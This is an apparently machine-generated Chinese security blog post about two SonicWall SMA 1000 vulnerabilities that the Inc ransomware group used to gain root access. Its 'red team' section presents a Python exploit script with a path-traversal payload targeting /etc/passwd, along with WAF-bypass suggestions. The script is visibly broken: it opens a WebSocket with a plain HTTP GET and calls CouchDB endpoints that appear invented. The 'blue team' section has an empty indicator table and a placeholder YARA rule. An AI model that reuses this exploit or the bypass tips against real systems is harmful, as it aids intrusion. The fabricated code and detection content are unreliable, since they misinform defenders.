---
layout: post
title:  "勒索軟體Inc利用SonicWall防火牆弱點取得root權限，藉此在受害組織加密檔案"
date:   2026-08-04 08:27:06 +0000
categories: [security]
severity: critical
---

# 🚨 解析 CVE-2026-15409 和 CVE-2026-15410 漏洞利用技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: WebSocket隧道、CouchDB讀寫檔案、路徑遍歷酬載

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: SonicWall SMA 1000設備中的/wsproxy請求處理函數沒有正確驗證用戶身份，導致未經身分驗證的WebSocket隧道可以被建立。
* **攻擊流程圖解**:
  1.駭客發送未經身分驗證的/wsproxy請求。
  2.建立WebSocket隧道。
  3.存取CouchDB服務。
  4.以使用者的身分呼叫CouchDB讀寫檔案。
  5.呼叫特定功能函數，取得低權限的指令執行能力。
  6.呼叫另一個功能函數，利用路徑遍歷酬載，觸發CVE-2026-15410。
  7.得到root權限。
  8.植入惡意軟體KnuckleBall，並將Suo5與OrangeTail注入記憶體執行。
* **受影響元件**: SonicWall SMA 1000設備，版本號未指定。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 網際網路連線。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 建立WebSocket隧道
    ws_url = "ws://target_ip/wsproxy"
    ws = requests.get(ws_url, headers={"Upgrade": "websocket"})
    
    # 存取CouchDB服務
    couchdb_url = "http://target_ip:5984/_utils/"
    response = requests.get(couchdb_url)
    
    # 呼叫CouchDB讀寫檔案
    file_url = "http://target_ip:5984/_utils/_files/"
    response = requests.get(file_url)
    
    # 呼叫特定功能函數
    func_url = "http://target_ip:5984/_utils/_func/"
    response = requests.get(func_url)
    
    # 利用路徑遍歷酬載
    payload = "/../etc/passwd"
    response = requests.get(func_url + payload)
    
    ```
* **繞過技術**: 可以使用WAF繞過技巧，例如使用HTTP隧道或加密payload。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  |  | /wsproxy |
|  |  |  | /_utils/ |
|  |  |  | /_files/ |
|  |  |  | /_func/ |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule SonicWall_SMA_1000_Vulnerability {
      meta:
        description = "SonicWall SMA 1000漏洞利用"
        author = "Your Name"
      strings:
        $wsproxy = "/wsproxy"
        $couchdb = "/_utils/"
        $file = "/_files/"
        $func = "/_func/"
      condition:
        any of ($wsproxy, $couchdb, $file, $func)
    }
    
    ```
* **緩解措施**: 更新SonicWall SMA 1000設備的軟體版本，關閉未使用的服務，限制網際網路連線。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **WebSocket**: 一種網際網路通訊協定，允許客戶端和伺服器之間建立全雙工通訊。
* **CouchDB**: 一種NoSQL資料庫，使用JSON文件儲存資料。
* **路徑遍歷酬載**: 一種攻擊技術，利用路徑遍歷漏洞，讀取或寫入未經授權的檔案。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/177862)
- [SonicWall官網](https://www.sonicwall.com/)
- [MITRE ATT&CK](https://attack.mitre.org/)


